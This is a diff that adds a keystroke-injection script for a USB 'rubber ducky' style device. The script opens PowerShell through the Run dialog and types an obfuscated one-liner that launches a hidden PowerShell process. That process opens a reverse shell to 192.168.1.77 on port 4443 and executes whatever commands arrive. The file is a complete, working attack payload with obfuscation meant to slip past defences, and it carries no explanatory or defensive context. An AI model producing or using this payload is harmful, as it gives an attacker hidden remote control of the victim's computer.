@@ -1,0 +1,16 @@
+DELAY 500
+GUI m
+DELAY 200
+GUI r
+DELAY 200
+STRING powershell
+DELAY 100
+ENTER
+DELAY 500
+STRING S""t""a''rt-Process $PSHOME\powershell.exe -ArgumentList {$71120079a2604377ab1b2a9fd925ab14 = N""ew-Object S''y''s""t''em.Net.Sockets.TCPClient('192.168.1.77',4443);$f43130394fdb4565b88c452800d7ffa9 = $71120079a2604377ab1b2a9fd925ab14.GetStream();[byte[]]$1c53e5002dc44c288000307bf970d5c3 = 0..65535|%{0};while(($2af49932cbb64d2e902318c7744b4e1f = $f43130394fdb4565b88c452800d7ffa9.Read($1c53e5002dc44c288000307bf970d5c3, 0, $1c53e5002dc44c288000307bf970d5c3.Length)) -ne 0){;$318da0ab6724448f9175870ad5ef8c4e = (N""ew-Object -TypeName S""y''s''t""em.Text.ASCIIEncoding).GetString($1c53e5002dc44c288000307bf970d5c3,0, $2af49932cbb64d2e902318c7744b4e1f);$e1c5329fe1a44e0c9f2ebff4dd42a9cb = (i""ex $318da0ab6724448f9175870ad5ef8c4e 2>&1 | O""ut-String );$303e796e5f53499598963a9a6dc24e5b = $e1c5329fe1a44e0c9f2ebff4dd42a9cb + 'PS ' + (p''wd).Path + '> ';$9a52672349904051971585254ca3882f = ([text.encoding]::ASCII).GetBytes($303e796e5f53499598963a9a6dc24e5b);$f43130394fdb4565b88c452800d7ffa9.Write($9a52672349904051971585254ca3882f,0,$9a52672349904051971585254ca3882f.Length);$f43130394fdb4565b88c452800d7ffa9.Flush()};$71120079a2604377ab1b2a9fd925ab14.Close()} -WindowStyle H''i""d''d''en
+DELAY 100
+ENTER
+DELAY 200
+STRING exit
+DELAY 100
+ENTER
